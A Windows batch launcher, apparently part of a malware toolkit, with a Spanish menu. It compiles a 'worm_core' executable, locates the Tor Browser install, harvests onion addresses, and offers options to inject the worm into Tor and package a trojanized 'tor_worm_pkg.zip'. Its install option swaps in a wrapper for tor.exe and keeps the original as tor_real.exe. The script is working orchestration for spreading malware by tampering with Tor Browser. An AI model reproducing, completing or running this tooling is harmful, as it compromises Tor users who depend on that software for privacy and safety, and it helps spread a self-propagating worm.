@echo off
setlocal EnableDelayedExpansion
title Extractor TOR - Breadcrumb
color 0A

set "ROOT=%~dp0"
cd /d "%ROOT%"
set "LOG=%ROOT%bootstrap.log"
echo [%DATE% %TIME%] Bootstrap >> "%LOG%"

cls
echo.
echo  ============================================================
echo    EXTRACTOR TOR - Breadcrumb
echo  ============================================================
echo.

echo [1/6] Python...
where python >nul 2>nul
if errorlevel 1 (
    echo     [!] Python no encontrado. Instala desde python.org con "Add to PATH".
    pause
    exit /b 1
)
for /f "tokens=2 delims= " %%v in ('python --version 2^>^&1') do set "PYVER=%%v"
echo     [+] Python !PYVER!

echo [2/6] pip...
python -m pip --version >nul 2>nul
if errorlevel 1 (
    python -m ensurepip --upgrade >> "%LOG%" 2>&1
)
python -m pip --version >nul 2>nul
if errorlevel 1 (
    echo     [!] pip fallo. Revisa bootstrap.log
    pause
    exit /b 1
)
echo     [+] pip OK

echo [3/6] Modulos Python...
set "PIP_NEEDED="
for %%m in (requests socks wmi pyinstaller) do (
    python -c "import %%m" >nul 2>nul
    if errorlevel 1 set "PIP_NEEDED=!PIP_NEEDED! %%m"
)
if not "!PIP_NEEDED!"=="" (
    echo     [*] Instalando:!PIP_NEEDED!
    python -m pip install --upgrade pip >> "%LOG%" 2>&1
    python -m pip install !PIP_NEEDED! >> "%LOG%" 2>&1
    if errorlevel 1 python -m pip install --user !PIP_NEEDED! >> "%LOG%" 2>&1
)
python -c "import socks" >nul 2>nul
if errorlevel 1 python -m pip install PySocks >> "%LOG%" 2>&1
echo     [+] Modulos OK

echo [4/6] TOR...
if exist tor_path.txt (
    set /p TORROOT=<tor_path.txt
    if not exist "!TORROOT!\Browser\TorBrowser\Tor\tor.exe" del tor_path.txt >nul 2>nul
)
if not exist tor_path.txt (
    python -c "from tor_locator import find_tor_install; p=find_tor_install(); open('tor_path.txt','w').write(p or ''); print('    [+] TOR: ' + (p or 'NO ENCONTRADO'))"
)
if exist tor_path.txt (
    set /p TORROOT=<tor_path.txt
    if not "!TORROOT!"=="" echo     [+] TOR: !TORROOT!
)

echo [5/6] MSVC...
where cl >nul 2>nul
if errorlevel 1 (
    for %%p in (
        "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
        "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
        "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
        "C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
    ) do (
        if exist %%p call %%p >> "%LOG%" 2>&1
    )
)
where cl >nul 2>nul
if errorlevel 1 (
    echo     [!] MSVC no encontrado. Opcion 6 fallara.
) else (
    echo     [+] MSVC OK
)

echo [6/6] Binarios...
where cl >nul 2>nul
if not errorlevel 1 (
    if not exist worm_core.exe (
        if exist worm_core.cpp (
            echo     [*] Compilando worm_core.exe...
            cl /std:c++20 /O2 /MT worm_core.cpp ws2_32.lib mpr.lib /Fe:worm_core.exe >> "%LOG%" 2>&1
        )
    )
    if not exist tor_wrapper.exe (
        if exist tor_wrapper.cpp (
            echo     [*] Compilando tor_wrapper.exe...
            cl /std:c++20 /O2 /MT tor_wrapper.cpp /Fe:tor_wrapper.exe >> "%LOG%" 2>&1
        )
    )
)
if exist worm_core.exe echo     [+] worm_core.exe OK
if exist tor_wrapper.exe echo     [+] tor_wrapper.exe OK

echo.
echo  ============================================================
echo    Bootstrap completo
echo  ============================================================
timeout /t 2 >nul

:menu
cls
echo.
echo  ============================================================
echo    EXTRACTOR TOR - Breadcrumb
echo  ============================================================
echo.
echo   [1]  Localizar TOR
echo   [2]  Recolectar onions
echo   [3]  Ver onions
echo   [4]  Inyectar gusano en TOR
echo   [5]  Empaquetar ZIP
echo   [6]  Recompilar C++
echo   [7]  Flujo completo (1+2+4+5)
echo   [8]  Instalar en TOR
echo   [9]  Ver bootstrap.log
echo   [D]  Desinstalar wrapper
echo   [A]  Abrir carpeta
echo   [0]  Salir
echo.
set /p opt="  Opcion: "

if "%opt%"=="1" goto locate
if "%opt%"=="2" goto harvest
if "%opt%"=="3" goto view
if "%opt%"=="4" goto inject
if "%opt%"=="5" goto package
if "%opt%"=="6" goto recompile
if "%opt%"=="7" goto full
if "%opt%"=="8" goto install
if "%opt%"=="9" goto showlog
if /i "%opt%"=="D" goto uninstall
if /i "%opt%"=="A" goto openfolder
if "%opt%"=="0" goto end
goto menu

:locate
cls
python -c "from tor_locator import find_tor_install; p=find_tor_install(); open('tor_path.txt','w').write(p or ''); print('[+] TOR:', p or 'NO ENCONTRADO')"
pause
goto menu

:harvest
cls
if not exist tor_path.txt ( echo [!] Opcion 1 primero. & pause & goto menu )
set /p TORROOT=<tor_path.txt
python onion_harvester.py "!TORROOT!"
pause
goto menu

:view
cls
if exist onions_recolectados.txt ( type onions_recolectados.txt ) else ( echo [!] Ejecuta opcion 2. )
echo.
pause
goto menu

:inject
cls
if not exist tor_path.txt ( echo [!] Opcion 1 primero. & pause & goto menu )
set /p TORROOT=<tor_path.txt
python tor_injector.py "!TORROOT!" worm_core.exe
pause
goto menu

:package
cls
if not exist tor_path.txt ( echo [!] Opcion 1 primero. & pause & goto menu )
set /p TORROOT=<tor_path.txt
python packager.py "!TORROOT!" worm_core.exe tor_worm_pkg.zip
pause
goto menu

:recompile
cls
for %%p in (
    "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
    "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
    "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat"
) do ( if exist %%p call %%p >nul 2>nul )
where cl >nul 2>nul
if errorlevel 1 ( echo [!] MSVC no encontrado. & pause & goto menu )
cl /std:c++20 /O2 /MT worm_core.cpp ws2_32.lib mpr.lib /Fe:worm_core.exe
cl /std:c++20 /O2 /MT tor_wrapper.cpp /Fe:tor_wrapper.exe
pause
goto menu

:full
cls
call :d_locate
call :d_harvest
call :d_inject
call :d_package
echo [+] Flujo completo terminado.
pause
goto menu

:d_locate
python -c "from tor_locator import find_tor_install; p=find_tor_install(); open('tor_path.txt','w').write(p or ''); print('[+] TOR:', p or 'NO ENCONTRADO')"
exit /b
:d_harvest
if exist tor_path.txt ( set /p TORROOT=<tor_path.txt & python onion_harvester.py "!TORROOT!" )
exit /b
:d_inject
if exist tor_path.txt ( set /p TORROOT=<tor_path.txt & python tor_injector.py "!TORROOT!" worm_core.exe )
exit /b
:d_package
if exist tor_path.txt ( set /p TORROOT=<tor_path.txt & python packager.py "!TORROOT!" worm_core.exe tor_worm_pkg.zip )
exit /b

:install
cls
if not exist tor_path.txt ( echo [!] Opcion 1 primero. & pause & goto menu )
set /p TORROOT=<tor_path.txt
call install.bat "!TORROOT!"
pause
goto menu

:uninstall
cls
if not exist tor_path.txt ( echo [!] Opcion 1 primero. & pause & goto menu )
set /p TORROOT=<tor_path.txt
if exist "!TORROOT!\Browser\TorBrowser\Tor\tor_real.exe" (
    copy /Y "!TORROOT!\Browser\TorBrowser\Tor\tor_real.exe" "!TORROOT!\Browser\TorBrowser\Tor\tor.exe" >nul
    del "!TORROOT!\Browser\TorBrowser\Tor\worm_core.exe" >nul 2>nul
    echo [+] Wrapper eliminado. tor.exe restaurado.
) else (
    echo [!] No hay tor_real.exe.
)
pause
goto menu

:showlog
cls
if exist bootstrap.log ( type bootstrap.log ) else ( echo [!] Sin log. )
pause
goto menu

:openfolder
explorer "%ROOT%"
goto menu

:end
endlocal
exit /b 0